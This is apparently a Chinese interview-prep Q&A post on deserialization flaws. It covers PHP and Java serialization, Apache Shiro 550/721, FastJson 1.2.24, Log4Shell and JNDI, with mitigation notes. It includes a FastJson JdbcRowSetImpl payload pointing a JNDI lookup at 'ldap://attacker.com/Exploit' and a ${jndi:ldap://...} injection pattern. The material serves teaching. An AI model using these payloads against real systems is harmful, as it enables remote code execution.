---
title: "面经 · 反序列化 · 问答"
series_order: 2
date: 2026-04-13 12:00:00 +0800
categories:
  - 反序列化
---

## 正文

十、反序列化


1. php/java 反序列化漏洞的原理? 解决方案?
php 中围绕着 serialize()，unserialize() 这两个函数，序列化就是把一个对象变成可以传输的字符串, 如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了。

O:7:"chybeta":1:{s:4:"test";s:3:"123";}

这里的 O 代表存储的是对象（object）, 假如你给 serialize() 传入的是一个数组，那它会变成字母 a。7 表示对象的名称有 7 个字符。"chybeta" 表示对象的名称。1 表示有一个值。{s:4:"test";s:3:"123";} 中，s 表示字符串，4 表示该字符串的长度，"test" 为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。

JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream 类的 writeObject() 方法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

面试题+答案：

反序列化漏洞的原理
2. 对用户的输入进行了反序列化处理，导致攻击者可以构造恶意的序列化数据，让反序列化时执行 Java 恶意命令。

关于apache的shrio反序列化，你知道什么？
3. 反序列化漏洞有 shiro 550 和 721，两者对应的shiro版本和应用场景不同。
4. 是在 shiro1.2.4 版本以下 的加密密钥硬编码在源码中，因此可以利用默认密钥在未登录的情况下，通过登录时的 rememberMe 功能，将恶意序列化数据进行aes加密、base64编码以后提交给服务器，服务器进行 base64 解码、 aes 解密、最后反序列化，执行恶意类的代码。
5. 是在 shiro1.2.5-1.4.1 ，在登陆成功以后，将有效的rememberMe cookie作为前缀，使用 Padding Oracle Attack 爆破和篡改序列化内容，构造出可正常反序列化的恶意数据，触发反序列化漏洞。


---

补充（FastJson / JNDI / Log4j2）：

### 1. FastJson 1.2.24 反序列化漏洞（典型：`JdbcRowSetImpl` + JNDI）

**原理要点**：

- FastJson 支持 `@type` 指定反序列化目标类；早期版本对可反序列化的类限制不足。
- 攻击者可选用 JDK/依赖中自带的 gadget 类（如 `com.sun.rowset.JdbcRowSetImpl`），通过设置其属性触发 **JNDI lookup**（如 `ldap://...`、`rmi://...`），最终导致远程类加载/命令执行（取决于目标 Java 版本、JNDI 行为与运行环境）。

**典型 Payload（学习用）**：

```json
{
  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",
  \"dataSourceName\": \"ldap://attacker.com/Exploit\",
  \"autoCommit\": true
}
```

字段含义：

- `dataSourceName`：JNDI 地址
- `autoCommit=true`：在部分链路中用于触发连接/lookup

### 2. Log4j2（Log4Shell，CVE-2021-44228）为什么会触发 JNDI？

**核心原因**：Log4j2 早期支持 Lookup 机制，日志内容里出现形如 `${jndi:ldap://...}` 时会进行解析并触发 JNDI 请求；当攻击者能控制日志内容（如 `User-Agent`、用户名、错误信息），就可注入该表达式，引发远程查找并形成 RCE 风险。

**修复要点**：

- 升级到安全版本（常见建议：`2.17.0+`）
- 禁用/移除相关 Lookup（不同版本措施不同）

### 3. JNDI 是什么？

JNDI（Java Naming and Directory Interface）是 Java 用于访问**命名服务/目录服务**的 API（LDAP、RMI、DNS 等）。正常用途包括查找 `DataSource`、EJB、读取目录信息；被滥用时，攻击者将 lookup 指向外部恶意服务，造成远程加载/执行风险。
